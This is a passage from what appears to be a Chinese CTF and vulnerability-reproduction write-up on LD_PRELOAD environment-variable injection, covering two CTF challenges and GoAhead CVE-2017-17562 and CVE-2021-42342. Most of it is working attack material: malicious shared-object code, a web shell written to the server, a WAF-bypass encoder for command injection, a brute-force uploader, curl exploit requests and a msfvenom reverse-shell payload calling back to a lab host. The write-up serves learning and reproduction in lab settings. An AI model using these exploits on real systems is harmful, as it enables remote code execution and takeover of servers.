</span></span><span style=display:flex><span>	<span style=color:#75af00>err</span> <span style=color:#111>=</span> <span style=color:#75af00>http</span><span style=color:#111>.</span><span style=color:#75af00>ListenAndServe</span><span style=color:#111>(</span><span style=color:#d88200>&#34;:9090&#34;</span><span style=color:#111>,</span> <span style=color:#00a8c8>nil</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>	<span style=color:#00a8c8>if</span> <span style=color:#75af00>err</span> <span style=color:#f92672>!=</span> <span style=color:#00a8c8>nil</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span>		<span style=color:#75af00>log</span><span style=color:#111>.</span><span style=color:#75af00>Fatal</span><span style=color:#111>(</span><span style=color:#d88200>&#34;ListenAndServe: &#34;</span><span style=color:#111>,</span> <span style=color:#75af00>err</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>	<span style=color:#111>}</span>
</span></span><span style=display:flex><span><span style=color:#111>}</span>
</span></span></code></pre></div><p>所以我们需要SSRF访问9091端口的/manage 并且绕waf进行命令注入读flag</p><p>注意到web服务的/token路由可以设置环境变量，我们自然想到利用LD_PRELOAD和恶意.so来劫持系统函数进行rce</p><p>传文件，通过web的<code>/token?http_proxy=http://127.0.0.1:8080</code>可以获得当前token（即上传目录</p><p>之后上传恶意.so</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#75715e>#include</span><span style=color:#75715e>&lt;stdlib.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#111>__attribute__</span><span style=color:#111>((</span><span style=color:#111>constructor</span><span style=color:#111>))</span> <span style=color:#00a8c8>void</span> <span style=color:#111>l3yx</span><span style=color:#111>(){</span>
</span></span><span style=display:flex><span>    <span style=color:#111>unsetenv</span><span style=color:#111>(</span><span style=color:#d88200>&#34;LD_PRELOAD&#34;</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span>    <span style=color:#111>system</span><span style=color:#111>(</span><span style=color:#111>getenv</span><span style=color:#111>(</span><span style=color:#d88200>&#34;_evilcmd&#34;</span><span style=color:#111>));</span>
</span></span><span style=display:flex><span><span style=color:#111>}</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ gcc -shared -fPIC e.c -o e.so
</span></span></code></pre></div><p>在<code>/token?LD_PRELOAD=/code/uploads/{token}&_evilcmd=ls%20-l%20/&http_proxy=127.0.0.1:8080</code>下进行注入，成功rce</p><p>之后弹个shell</p><p>最后，对于waf，用这个（之前也见过</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#111>n</span> <span style=color:#f92672>=</span> <span style=color:#111>dict</span><span style=color:#111>()</span>
</span></span><span style=display:flex><span><span style=color:#111>n</span><span style=color:#111>[</span><span style=color:#ae81ff>0</span><span style=color:#111>]</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#39;0&#39;</span>
</span></span><span style=display:flex><span><span style=color:#111>n</span><span style=color:#111>[</span><span style=color:#ae81ff>1</span><span style=color:#111>]</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#39;${##}&#39;</span>
</span></span><span style=display:flex><span><span style=color:#111>n</span><span style=color:#111>[</span><span style=color:#ae81ff>2</span><span style=color:#111>]</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#39;$((${##}&lt;&lt;${##}))&#39;</span>
</span></span><span style=display:flex><span><span style=color:#111>n</span><span style=color:#111>[</span><span style=color:#ae81ff>3</span><span style=color:#111>]</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#39;$(($((${##}&lt;&lt;${##}))#${##}${##}))&#39;</span>
</span></span><span style=display:flex><span><span style=color:#111>n</span><span style=color:#111>[</span><span style=color:#ae81ff>4</span><span style=color:#111>]</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#39;$((${##}&lt;&lt;$((${##}&lt;&lt;${##}))))&#39;</span>
</span></span><span style=display:flex><span><span style=color:#111>n</span><span style=color:#111>[</span><span style=color:#ae81ff>5</span><span style=color:#111>]</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#39;$(($((${##}&lt;&lt;${##}))#${##}0${##}))&#39;</span>
</span></span><span style=display:flex><span><span style=color:#111>n</span><span style=color:#111>[</span><span style=color:#ae81ff>6</span><span style=color:#111>]</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#39;$(($((${##}&lt;&lt;${##}))#${##}${##}0))&#39;</span>
</span></span><span style=display:flex><span><span style=color:#111>n</span><span style=color:#111>[</span><span style=color:#ae81ff>7</span><span style=color:#111>]</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#39;$(($((${##}&lt;&lt;${##}))#${##}${##}${##}))&#39;</span>
</span></span><span style=display:flex><span><span style=color:#111>f</span><span style=color:#f92672>=</span><span style=color:#d88200>&#39;&#39;</span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>def</span> <span style=color:#75af00>str_to_oct</span><span style=color:#111>(</span><span style=color:#111>cmd</span><span style=color:#111>):</span>
</span></span><span style=display:flex><span>    <span style=color:#111>s</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#34;&#34;</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>for</span> <span style=color:#111>t</span> <span style=color:#f92672>in</span> <span style=color:#111>cmd</span><span style=color:#111>:</span>
</span></span><span style=display:flex><span>        <span style=color:#111>o</span> <span style=color:#f92672>=</span> <span style=color:#111>(</span><span style=color:#d88200>&#39;</span><span style=color:#d88200>%s</span><span style=color:#d88200>&#39;</span> <span style=color:#f92672>%</span> <span style=color:#111>(</span><span style=color:#111>oct</span><span style=color:#111>(</span><span style=color:#111>ord</span><span style=color:#111>(</span><span style=color:#111>t</span><span style=color:#111>))))[</span><span style=color:#ae81ff>2</span><span style=color:#111>:]</span>
</span></span><span style=display:flex><span>        <span style=color:#111>s</span><span style=color:#f92672>+=</span><span style=color:#d88200>&#39;</span><span style=color:#8045ff>\\</span><span style=color:#d88200>&#39;</span><span style=color:#f92672>+</span><span style=color:#111>o</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>return</span> <span style=color:#111>s</span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>def</span> <span style=color:#75af00>build</span><span style=color:#111>(</span><span style=color:#111>cmd</span><span style=color:#111>):</span>
</span></span><span style=display:flex><span>    <span style=color:#111>payload</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#34;$0&lt;&lt;&lt;$0\&lt;\&lt;\&lt;\$</span><span style=color:#8045ff>\\\&#39;</span><span style=color:#d88200>&#34;</span>
</span></span><span style=display:flex><span>    <span style=color:#111>s</span> <span style=color:#f92672>=</span> <span style=color:#111>str_to_oct</span><span style=color:#111>(</span><span style=color:#111>cmd</span><span style=color:#111>)</span><span style=color:#f92672>.</span><span style=color:#111>split</span><span style=color:#111>(</span><span style=color:#d88200>&#39;</span><span style=color:#8045ff>\\</span><span style=color:#d88200>&#39;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>for</span> <span style=color:#111>_</span> <span style=color:#f92672>in</span> <span style=color:#111>s</span><span style=color:#111>[</span><span style=color:#ae81ff>1</span><span style=color:#111>:]:</span>
</span></span><span style=display:flex><span>        <span style=color:#111>payload</span><span style=color:#f92672>+=</span><span style=color:#d88200>&#34;</span><span style=color:#8045ff>\\\\</span><span style=color:#d88200>&#34;</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>for</span> <span style=color:#111>i</span> <span style=color:#f92672>in</span> <span style=color:#111>_</span><span style=color:#111>:</span>
</span></span><span style=display:flex><span>            <span style=color:#111>payload</span><span style=color:#f92672>+=</span><span style=color:#111>n</span><span style=color:#111>[</span><span style=color:#111>int</span><span style=color:#111>(</span><span style=color:#111>i</span><span style=color:#111>)]</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>return</span> <span style=color:#111>payload</span><span style=color:#f92672>+</span><span style=color:#d88200>&#39;</span><span style=color:#8045ff>\\\&#39;</span><span style=color:#d88200>&#39;</span>
</span></span><span style=display:flex><span><span style=color:#111>print</span><span style=color:#111>(</span><span style=color:#111>build</span><span style=color:#111>(</span><span style=color:#d88200>&#39;cat /flag&#39;</span><span style=color:#111>))</span>
</span></span></code></pre></div><p><code>curl "http://localhost:9091/manage?m=%3b{urlencode(payload)}"</code></p><h3 id=虎符ctf-2022ezphp>[虎符CTF 2022]ezphp</h3><p><a href="https://mp.weixin.qq.com/s?__biz=Mzg2MjYxMjAzMg==&mid=2247483903&idx=1&sn=26b6af39bc1bf9a0055c0be38a666472&chksm=ce047ed0f973f7c6b7a2ee4a300d10d22cf2a6e38fcbe5190011c8f08b14da9a30db2bf11061&mpshare=1&scene=23&srcid=0321x9PydhpbLJpuag0EBm4W&sharer_sharetime=1647861577180&sharer_shareid=3679f20229d72930158c21ee7f573b1e#rd">wp</a></p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#75af00>php</span> <span style=color:#111>(</span><span style=color:#00a8c8>empty</span><span style=color:#111>(</span><span style=color:#111>$_GET</span><span style=color:#111>[</span><span style=color:#d88200>&#34;env&#34;</span><span style=color:#111>]))</span> <span style=color:#f92672>?</span> <span style=color:#75af00>highlight_file</span><span style=color:#111>(</span><span style=color:#00a8c8>__FILE__</span><span style=color:#111>)</span> <span style=color:#f92672>:</span> <span style=color:#75af00>putenv</span><span style=color:#111>(</span><span style=color:#111>$_GET</span><span style=color:#111>[</span><span style=color:#d88200>&#34;env&#34;</span><span style=color:#111>])</span> <span style=color:#f92672>&amp;&amp;</span> <span style=color:#75af00>system</span><span style=color:#111>(</span><span style=color:#d88200>&#39;echo hfctf2022&#39;</span><span style=color:#111>);</span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></div><p>oneline php，看到这个putenv再结合前面的栗子应该不陌生了就，结合Nginx上传临时文件 传.so</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#75715e>#define _GNU_SOURCE
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdlib.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;string.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#111>__attribute__</span> <span style=color:#111>((</span><span style=color:#111>__constructor__</span><span style=color:#111>))</span> <span style=color:#00a8c8>void</span> <span style=color:#111>preload</span> <span style=color:#111>(</span><span style=color:#00a8c8>void</span><span style=color:#111>){</span>
</span></span><span style=display:flex><span>    <span style=color:#111>system</span><span style=color:#111>(</span><span style=color:#d88200>&#34;echo </span><span style=color:#8045ff>\&#34;</span><span style=color:#d88200>&lt;?php eval(</span><span style=color:#8045ff>\\</span><span style=color:#d88200>$_POST[cmd]);?&gt;</span><span style=color:#8045ff>\&#34;</span><span style=color:#d88200> &gt; /var/www/html/ame.php&#34;</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span><span style=color:#111>}</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ gcc -fPIC -shared evil.c -o evil.so
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span>  <span style=color:#111>threading</span><span style=color:#f92672>,</span> <span style=color:#111>requests</span>
</span></span><span style=display:flex><span><span style=color:#111>URL2</span> <span style=color:#f92672>=</span> <span style=color:#d88200>f</span><span style=color:#d88200>&#39;http://127.0.0.1:30002/index.php&#39;</span>
</span></span><span style=display:flex><span><span style=color:#111>nginx_workers</span> <span style=color:#f92672>=</span> <span style=color:#111>[</span><span style=color:#ae81ff>12</span><span style=color:#111>,</span><span style=color:#ae81ff>13</span><span style=color:#111>,</span><span style=color:#ae81ff>14</span><span style=color:#111>,</span><span style=color:#ae81ff>15</span><span style=color:#111>,</span><span style=color:#ae81ff>16</span><span style=color:#111>,</span><span style=color:#ae81ff>17</span><span style=color:#111>,</span><span style=color:#ae81ff>18</span><span style=color:#111>,</span><span style=color:#ae81ff>19</span><span style=color:#111>,</span><span style=color:#ae81ff>20</span><span style=color:#111>,</span><span style=color:#ae81ff>21</span><span style=color:#111>,</span><span style=color:#ae81ff>22</span><span style=color:#111>,</span><span style=color:#ae81ff>23</span><span style=color:#111>,</span><span style=color:#ae81ff>24</span><span style=color:#111>,</span><span style=color:#ae81ff>25</span><span style=color:#111>,</span><span style=color:#ae81ff>26</span><span style=color:#111>,</span><span style=color:#ae81ff>27</span><span style=color:#111>]</span>
</span></span><span style=display:flex><span><span style=color:#111>done</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>False</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>def</span> <span style=color:#75af00>uploader</span><span style=color:#111>():</span>
</span></span><span style=display:flex><span>    <span style=color:#111>print</span><span style=color:#111>(</span><span style=color:#d88200>&#39;[+] starting uploader&#39;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>with</span> <span style=color:#111>open</span><span style=color:#111>(</span><span style=color:#d88200>&#34;exp.so&#34;</span><span style=color:#111>,</span><span style=color:#d88200>&#34;rb&#34;</span><span style=color:#111>)</span> <span style=color:#00a8c8>as</span> <span style=color:#111>f</span><span style=color:#111>:</span>
</span></span><span style=display:flex><span>        <span style=color:#111>data</span> <span style=color:#f92672>=</span> <span style=color:#111>f</span><span style=color:#f92672>.</span><span style=color:#111>read</span><span style=color:#111>()</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>while</span> <span style=color:#f92672>not</span> <span style=color:#111>done</span><span style=color:#111>:</span>
</span></span><span style=display:flex><span>        <span style=color:#111>requests</span><span style=color:#f92672>.</span><span style=color:#111>get</span><span style=color:#111>(</span><span style=color:#111>URL2</span><span style=color:#111>,</span> <span style=color:#111>data</span><span style=color:#f92672>=</span><span style=color:#111>data</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>for</span> <span style=color:#111>_</span> <span style=color:#f92672>in</span> <span style=color:#111>range</span><span style=color:#111>(</span><span style=color:#ae81ff>16</span><span style=color:#111>):</span>
</span></span><span style=display:flex><span>    <span style=color:#111>t</span> <span style=color:#f92672>=</span> <span style=color:#111>threading</span><span style=color:#f92672>.</span><span style=color:#111>Thread</span><span style=color:#111>(</span><span style=color:#111>target</span><span style=color:#f92672>=</span><span style=color:#111>uploader</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>    <span style=color:#111>t</span><span style=color:#f92672>.</span><span style=color:#111>start</span><span style=color:#111>()</span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>def</span> <span style=color:#75af00>bruter</span><span style=color:#111>(</span><span style=color:#111>pid</span><span style=color:#111>):</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>global</span> <span style=color:#111>done</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>while</span> <span style=color:#f92672>not</span> <span style=color:#111>done</span><span style=color:#111>:</span>
</span></span><span style=display:flex><span>        <span style=color:#111>print</span><span style=color:#111>(</span><span style=color:#d88200>f</span><span style=color:#d88200>&#39;[+] brute loop restarted: </span><span style=color:#d88200>{</span><span style=color:#111>pid</span><span style=color:#d88200>}</span><span style=color:#d88200>&#39;</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>for</span> <span style=color:#111>fd</span> <span style=color:#f92672>in</span> <span style=color:#111>range</span><span style=color:#111>(</span><span style=color:#ae81ff>4</span><span style=color:#111>,</span> <span style=color:#ae81ff>32</span><span style=color:#111>):</span>
</span></span><span style=display:flex><span>            <span style=color:#00a8c8>try</span><span style=color:#111>:</span>
</span></span><span style=display:flex><span>                <span style=color:#111>requests</span><span style=color:#f92672>.</span><span style=color:#111>get</span><span style=color:#111>(</span><span style=color:#111>URL2</span><span style=color:#111>,</span> <span style=color:#111>params</span><span style=color:#f92672>=</span><span style=color:#111>{</span>
</span></span><span style=display:flex><span>                    <span style=color:#d88200>&#39;env&#39;</span><span style=color:#111>:</span> <span style=color:#d88200>f</span><span style=color:#d88200>&#34;LD_PRELOAD=/proc/</span><span style=color:#d88200>{</span><span style=color:#111>pid</span><span style=color:#d88200>}</span><span style=color:#d88200>/fd/</span><span style=color:#d88200>{</span><span style=color:#111>fd</span><span style=color:#d88200>}</span><span style=color:#d88200>&#34;</span>
</span></span><span style=display:flex><span>                <span style=color:#111>})</span>
</span></span><span style=display:flex><span>            <span style=color:#00a8c8>except</span><span style=color:#111>:</span>
</span></span><span style=display:flex><span>                <span style=color:#00a8c8>pass</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>for</span> <span style=color:#111>pid</span> <span style=color:#f92672>in</span> <span style=color:#111>nginx_workers</span><span style=color:#111>:</span>
</span></span><span style=display:flex><span>    <span style=color:#111>a</span> <span style=color:#f92672>=</span> <span style=color:#111>threading</span><span style=color:#f92672>.</span><span style=color:#111>Thread</span><span style=color:#111>(</span><span style=color:#111>target</span><span style=color:#f92672>=</span><span style=color:#111>bruter</span><span style=color:#111>,</span> <span style=color:#111>args</span><span style=color:#f92672>=</span><span style=color:#111>(</span><span style=color:#111>pid</span><span style=color:#111>,</span> <span style=color:#111>))</span>
</span></span><span style=display:flex><span>    <span style=color:#111>a</span><span style=color:#f92672>.</span><span style=color:#111>start</span><span style=color:#111>()</span>
</span></span></code></pre></div><h2 id=real-world>Real World</h2><h3 id=goahead--cve-2017-17562>GoAhead / CVE-2017-17562</h3><p>GoAhead: 2.5 ~ 3.6.5</p><p><a href=https://github.com/vulhub/vulhub/blob/master/goahead/CVE-2017-17562/README.zh-cn.md>复现 - vulhub</a> | <a href=https://www.elttam.com/blog/goahead/#content>REMOTE LD_PRELOAD EXPLOITATION GoAhead: Make My Day</a></p><p>GoAhead可以运行asp，js和标准的CGI程序，漏洞发生在运行CGI程序时</p><p>在收到请求后会从url参数中取出键值对并注册进CGI程序的环境变量，且只过滤了<code>REMOTE_HOST</code>和<code>HTTP_AUTHORIZATION</code>，而Linux下<code>LD_</code>开头的环境变量和动态链接库有关，比如<code>LD_PRELOAD</code>指定的动态链接库会自动加载，<code>LD_LIBRARY_PATH</code>指定的路径，程序会去其中寻找动态链接库</p><p>我们可以指定<code>LD_PRELOAD=/proc/self/fd/0</code>，因为<code>/proc/self/fd/0</code>是标准输入，而CGI程序中，POST数据流即为标准输入流，我们发送.so给<code>http://target/cgi-bin/index?LD_PRELOAD=/proc/self/fd/0</code>，CGI就会加载我们发送的动态链接库，造成RCE</p><p>测试一个hello world的.so</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;unistd.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>static</span> <span style=color:#00a8c8>void</span> <span style=color:#75af00>before_main</span><span style=color:#111>(</span><span style=color:#00a8c8>void</span><span style=color:#111>)</span> <span style=color:#111>__attribute__</span><span style=color:#111>((</span><span style=color:#111>constructor</span><span style=color:#111>));</span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>static</span> <span style=color:#00a8c8>void</span> <span style=color:#75af00>before_main</span><span style=color:#111>(</span><span style=color:#00a8c8>void</span><span style=color:#111>){</span>
</span></span><span style=display:flex><span>	<span style=color:#111>write</span><span style=color:#111>(</span><span style=color:#ae81ff>1</span><span style=color:#111>,</span> <span style=color:#d88200>&#34;Hello: World!</span><span style=color:#8045ff>\n</span><span style=color:#d88200>&#34;</span><span style=color:#111>,</span> <span style=color:#ae81ff>14</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span><span style=color:#111>}</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ gcc -shared -fPIC hello.c -o hello.so
</span></span><span style=display:flex><span>$ curl -X POST --data-binary @hello.so <span style=color:#d88200>&#34;url/cgi-bin/index?LD_PRELOAD=/proc/self/fd/0&#34;</span> -i
</span></span></code></pre></div><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220322204516436.png alt=image-20220322204516436></p><p>成功作为响应头输出；尝试反弹shell</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ msfvenom -a x64 --platform Linux -p linux/x64/shell_reverse_tcp <span style=color:#111>lhost</span><span style=color:#f92672>=</span>192.168.31.29 <span style=color:#111>lport</span><span style=color:#f92672>=</span><span style=color:#ae81ff>8426</span> -f elf-so -o p.so
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ curl -X POST --data-binary @p.so <span style=color:#d88200>&#34;http://192.168.31.214:8080/cgi-bin/index?LD_PRELOAD=/proc/self/fd/0&#34;</span> -i
</span></span></code></pre></div><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220322213915833.png alt=image-20220322213915833></p><h3 id=goahead--cve-2021-42342>GoAhead / CVE-2021-42342</h3><p><a href=https://github.com/vulhub/vulhub/blob/master/goahead/CVE-2021-42342/README.zh-cn.md>复现 - vulhub</a> | <a href=https://tttang.com/archive/1399/>GoAhead环境变量注入复现踩坑记</a></p><p>新的洞是对之前的一次绕过，补丁对用户传入参数进行了黑名单过滤，<code>LD_PRELOAD</code>这类参数不再设置为环境变量，但由于这个限制使用错了函数，导致实际上并没有生效；补丁还将用户传入的参数名前面增加了前缀，导致无法劫持任意环境变量，但这个限制漏掉了multipart的POST包，所以攻击者通过这个方式仍然可以注入任意环境变量</p><p>注意，新版本的GoAhead默认没有开启CGI，而老版本如果没有cgi-bin目录，或者里面没有cgi文件，也不受这个漏洞影响</p><p>旧的洞是通过设置<code>LD_PRELOAD=/proc/self/fd/0</code> 同时将恶意.so作为body传入，做到rce的效果，而这里我们需要在body中发送，所以我们选择提前在服务器上上传.so，之后再把<code>LD_PRELOAD</code>设置为这个文件的路径</p><p>与PHP一样，GoAhead在遇到上传内容时会存在临时文件，不过这里的坑在于临时文件的目录配置</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c++ data-lang=c++><span style=display:flex><span><span style=color:#75715e>#ifndef ME_GOAHEAD_UPLOAD_DIR
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#75715e>#define ME_GOAHEAD_UPLOAD_DIR &#34;tmp&#34;
</span></span></span><span style=display:flex><span><span style=color:#75715e>#endif
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#111>PUBLIC</span> <span style=color:#00a8c8>void</span> <span style=color:#75af00>websUploadOpen</span><span style=color:#111>(</span><span style=color:#00a8c8>void</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#111>{</span>
</span></span><span style=display:flex><span>    <span style=color:#111>uploadDir</span> <span style=color:#f92672>=</span> <span style=color:#111>ME_GOAHEAD_UPLOAD_DIR</span><span style=color:#111>;</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>if</span> <span style=color:#111>(</span><span style=color:#f92672>*</span><span style=color:#111>uploadDir</span> <span style=color:#f92672>==</span> <span style=color:#d88200>&#39;\0&#39;</span><span style=color:#111>)</span> <span style=color:#111>{</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#if ME_WIN_LIKE
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#111>uploadDir</span> <span style=color:#f92672>=</span> <span style=color:#111>getenv</span><span style=color:#111>(</span><span style=color:#d88200>&#34;TEMP&#34;</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#else
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#111>uploadDir</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#34;/tmp&#34;</span><span style=color:#111>;</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#endif
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#111>}</span>
</span></span><span style=display:flex><span>    <span style=color:#111>trace</span><span style=color:#111>(</span><span style=color:#ae81ff>4</span><span style=color:#111>,</span> <span style=color:#d88200>&#34;Upload directory is %s&#34;</span><span style=color:#111>,</span> <span style=color:#111>uploadDir</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span>    <span style=color:#111>websDefineHandler</span><span style=color:#111>(</span><span style=color:#d88200>&#34;upload&#34;</span><span style=color:#111>,</span> <span style=color:#ae81ff>0</span><span style=color:#111>,</span> <span style=color:#111>uploadHandler</span><span style=color:#111>,</span> <span style=color:#ae81ff>0</span><span style=color:#111>,</span> <span style=color:#ae81ff>0</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span><span style=color:#111>}</span>
</span></span></code></pre></div><p>如果宏<code>ME_GOAHEAD_UPLOAD_DIR</code>没有定义，则<code>uploadDir=/tmp</code>，而这个宏一定不为空，所以直接就是<code>tmp</code>，这个相对目录取决于pwd，而pwd是GoAhead启动时<code>--home</code>参数指定的，是存放配置文件的目录</p><p>如果<code>--home /etc/goahead</code>，那临时文件默认在<code>/etc/goahead/tmp</code>，如果这个目录不存在或者不可写，那么就会出现上传时500，一旦目标没有正常配置这个目录，就无法攻击（或者参见pbCTF2021 advancement的wp，使用python</p><p>这里直接修改Dockerfile来指定临时文件目录</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-dockerfile data-lang=dockerfile><span style=display:flex><span>make <span style=color:#111>SHOW</span><span style=color:#f92672>=</span><span style=color:#ae81ff>1</span> <span style=color:#111>ME_GOAHEAD_UPLOAD_DIR</span><span style=color:#f92672>=</span><span style=color:#d88200>&#34;&#39;\&#34;/tmp\&#34;&#39;&#34;</span><span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></div><p>尝试hello world</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;unistd.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>static</span> <span style=color:#00a8c8>void</span> <span style=color:#75af00>before_main</span><span style=color:#111>(</span><span style=color:#00a8c8>void</span><span style=color:#111>)</span> <span style=color:#111>__attribute__</span><span style=color:#111>((</span><span style=color:#111>constructor</span><span style=color:#111>));</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#00a8c8>static</span> <span style=color:#00a8c8>void</span> <span style=color:#75af00>before_main</span><span style=color:#111>(</span><span style=color:#00a8c8>void</span><span style=color:#111>)</span>
</span></span><span style=display:flex><span><span style=color:#111>{</span>
</span></span><span style=display:flex><span>    <span style=color:#111>write</span><span style=color:#111>(</span><span style=color:#ae81ff>1</span><span style=color:#111>,</span> <span style=color:#d88200>&#34;Hello: World</span><span style=color:#8045ff>\r\n\r\n</span><span style=color:#d88200>&#34;</span><span style=color:#111>,</span> <span style=color:#ae81ff>16</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span>    <span style=color:#111>write</span><span style=color:#111>(</span><span style=color:#ae81ff>1</span><span style=color:#111>,</span> <span style=color:#d88200>&#34;Hacked</span><span style=color:#8045ff>\n</span><span style=color:#d88200>&#34;</span><span style=color:#111>,</span> <span style=color:#ae81ff>7</span><span style=color:#111>);</span>
</span></span><span style=display:flex><span><span style=color:#111>}</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ gcc -shared -fPIC hello.c -o hello.so
</span></span><span style=display:flex><span>$ curl -v -F <span style=color:#111>data</span><span style=color:#f92672>=</span>@hello.so -F <span style=color:#d88200>&#34;LD_PRELOAD=/proc/self/fd/7&#34;</span> <span style=color:#d88200>&#34;url/cgi-bin/test&#34;</span> -i
